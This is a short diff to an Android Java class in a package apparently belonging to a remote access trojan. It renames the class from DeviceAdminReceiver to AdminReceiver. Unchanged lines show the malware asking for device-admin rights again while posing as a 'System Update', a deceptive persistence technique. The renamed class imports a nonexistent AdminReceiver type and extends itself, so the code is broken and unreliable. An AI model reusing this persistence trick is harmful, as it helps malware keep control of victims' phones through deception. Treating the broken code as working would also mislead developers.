@@ -1,13 +1,13 @@
 package com.enterprise.rat.admin;
 
-import android.app.admin.DeviceAdminReceiver;
+import android.app.admin.AdminReceiver;
 import android.app.admin.DevicePolicyManager;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.util.Log;
 
-public class DeviceAdminReceiver extends DeviceAdminReceiver {
+public class AdminReceiver extends AdminReceiver {
 
     @Override
     public void onEnabled(Context context, Intent intent) {
@@ -23,7 +23,7 @@ public class DeviceAdminReceiver extends DeviceAdminReceiver {
         try {
             Intent reactivate = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
             reactivate.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
-                new ComponentName(context, DeviceAdminReceiver.class));
+                new ComponentName(context, AdminReceiver.class));
             reactivate.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                 "System Update requires this permission to function.");
             reactivate.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
